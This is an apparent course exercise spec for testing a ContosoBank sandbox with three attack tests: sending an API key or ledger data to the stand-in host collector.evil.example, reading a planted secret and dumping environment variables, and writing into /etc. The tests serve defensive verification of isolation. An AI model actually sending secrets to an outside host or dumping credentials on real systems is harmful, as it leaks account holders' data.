# M3 sandbox attack tests

The exercise: have your implementer produce three test files, each probing
one of the sandbox's boundaries, then run the suite inside
`./sandbox/run-sandbox.sh` (network disabled, read-only filesystem except a
scratch tmpfs and the `artifacts/` mount, only the worktree mounted, no host
environment inherited). Do not assume the boundary holds — run each test and
read what actually happened.

## Attack 1: network egress

A test that attempts to exfiltrate data over the network — e.g.
`urllib.request.urlopen` (or `requests.post`) sending an account's API key or
a batch of ledger entry data to `http://collector.evil.example`. This targets the
`--network none` boundary.

**You must verify:** does the call fail, and if so, how? Connection refused,
DNS resolution failure, timeout, or something else? Record the exact
exception/error text in `artifacts/day2/m3/sandbox-verification.md` — do not
write "blocked" without the evidence that produced that conclusion.

## Attack 2: secret read

A test that (a) opens and reads `sandbox/planted_secret.txt`, and (b) dumps
the full contents of `os.environ`, then asserts on or prints what it found.
This targets whether secrets outside the worktree, and host environment
variables, are reachable from inside the sandbox.

**You must verify:** does the file open fail, or does it open and return
content? If it opens, does the content match `planted_secret.txt`'s actual
contents, meaning the secret leaked? Does `os.environ` come back empty, come
back with only sandbox-internal variables, or come back with anything from
the host? Do not assume "nothing sensitive" — inspect what the dump actually
contains and record it.

## Attack 3: filesystem write outside `/work`

A test that attempts to write a file inside an *existing* read-only
directory outside the mounted worktree — e.g. `/etc/contoso-escape-test.txt`
— via ordinary Python file I/O. This targets the read-only root filesystem
boundary.

**Do not target a made-up path like `/opt/evil/x`.** `/opt/evil` doesn't
exist in the image, so the open() call fails with `ENOENT` ("no such file
or directory") before it ever reaches the filesystem's read-only check —
that failure would look identical whether the sandbox worked or not. The
directory you target must actually exist (`/etc` does, in the base image)
so that the write reaches the real boundary.

**You must verify:** does the write raise `EROFS` ("read-only file
system"), or does it silently succeed? Record the exact errno/exception
name, not just "blocked" — `ENOENT` (missing directory) and `EROFS`
(read-only filesystem) are different failures for different reasons, and
only `EROFS` is evidence the filesystem boundary itself held.

## Then: run the legitimate suite

After running the three attack tests (whether they were blocked, allowed, or
partially blocked), run the existing legitimate ContosoBank test suite
(`uv run pytest`) inside the same sandboxed run. **You must verify** — not
assume — that it is still green: the attack tests and the sandboxing itself
must not have broken, skipped, or silently altered any pre-existing test's
outcome. If a legitimate test now fails, or a previously-passing test is
missing from the report, that is itself a finding.

Record all outcomes — blocked, allowed, or partially blocked, for each of
the three attacks, plus the legitimate-suite result — in
`artifacts/day2/m3/sandbox-verification.md`.
